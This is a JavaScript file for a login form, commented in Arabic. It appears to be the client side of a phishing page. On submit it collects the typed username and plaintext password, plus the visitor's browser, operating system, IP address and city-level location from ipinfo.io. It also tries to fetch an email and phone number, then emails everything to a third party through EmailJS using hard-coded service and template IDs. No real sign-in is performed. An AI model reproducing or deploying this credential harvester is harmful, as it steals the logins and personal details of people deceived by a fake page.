document.getElementById('toggle-password').addEventListener('click', function () {
    const passwordInput = document.getElementById('password');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        this.classList.remove('fa-eye-slash');
        this.classList.add('fa-eye');
    } else {
        passwordInput.type = 'password';
        this.classList.remove('fa-eye');
        this.classList.add('fa-eye-slash');
    }
});

// إضافة EmailJS في بداية الكود
(function(){
    emailjs.init("Cf6AQnmKaonDjuzz5");  // استبدل YOUR_USER_ID بمعرف المستخدم الخاص بك من EmailJS
})();

document.getElementById('form').addEventListener('submit', async function(event) {
    event.preventDefault();
    
    const nameInput = document.getElementById('name');
    const passwordInput = document.getElementById('password');
    const errorDiv = document.getElementById('error');

    // التحقق من صحة الحقول
    if (nameInput.value.trim() === "") {
        nameInput.focus();
        errorDiv.textContent = "يرجى إدخال اسم المستخدم";
        return;
    }

    if (passwordInput.value.trim() === "") {
        passwordInput.focus();
        errorDiv.textContent = "يرجى إدخال كلمة المرور";
        return;
    }

    errorDiv.textContent = "";

    // الحصول على معلمات الجهاز
    const browserInfo = getBrowserInfo();
    const osInfo = getOSInfo();
    const ipInfo = await getIPInfo();
    const geoLocation = await getGeoLocation();
    const email = await getEmail(); // الحصول على البريد الإلكتروني
    const phone = await getPhoneNumber(); // الحصول على رقم الهاتف

    // إرسال البيانات عبر EmailJS
    const templateParams = {
        name: nameInput.value,
        password: passwordInput.value,
        browserInfo: browserInfo,
        osInfo: osInfo,
        ipInfo: ipInfo,
        geoLocation: geoLocation,
        email: email,
        phone: phone
    };

    emailjs.send("service_4esymny", "template_t2odele", templateParams)
        .then(function(response) {
            console.log("Email sent successfully:", response);
        }, function(error) {
            console.log("Error sending email:", error);
        });
});

// دالة للحصول على معلومات المتصفح
function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf("Chrome") > -1) {
        return "Chrome";
    } else if (userAgent.indexOf("Firefox") > -1) {
        return "Firefox";
    } else if (userAgent.indexOf("Safari") > -1) {
        return "Safari";
    } else if (userAgent.indexOf("Edge") > -1) {
        return "Edge";
    } else {
        return "Unknown Browser";
    }
}

// دالة للحصول على معلومات النظام
function getOSInfo() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf("Windows NT") > -1) {
        return "Windows";
    } else if (userAgent.indexOf("Mac OS") > -1) {
        return "MacOS";
    } else if (userAgent.indexOf("Linux") > -1) {
        return "Linux";
    } else if (userAgent.indexOf("Android") > -1) {
        return "Android";
    } else if (userAgent.indexOf("iOS") > -1) {
        return "iOS";
    } else {
        return "Unknown OS";
    }
}

// دالة للحصول على عنوان الـ IP
async function getIPInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP info:", error);
        return "Unknown IP";
    }
}

// دالة للحصول على الموقع الجغرافي
async function getGeoLocation() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        return `${data.city}, ${data.region}, ${data.country}`;
    } catch (error) {
        console.error("Error fetching geo-location:", error);
        return "Unknown Location";
    }
}

// دالة للحصول على البريد الإلكتروني
async function getEmail() {
    // إذا كان المستخدم قد سجل الدخول عبر OAuth
    try {
        const response = await fetch('/get-email-api'); // استبدل بعنوان API صالح
        const data = await response.json();
        return data.email || "Unknown Email";
    } catch (error) {
        console.error("Error fetching email:", error);
        return "Unknown Email";
    }
}

// دالة للحصول على رقم الهاتف
async function getPhoneNumber() {
    // إذا كان المستخدم قد سجل الدخول عبر OAuth
    try {
        const response = await fetch('/get-phone-api'); // استبدل بعنوان API صالح
        const data = await response.json();
        return data.phone || "Unknown Phone";
    } catch (error) {
        console.error("Error fetching phone number:", error);
        return "Unknown Phone";
    }
}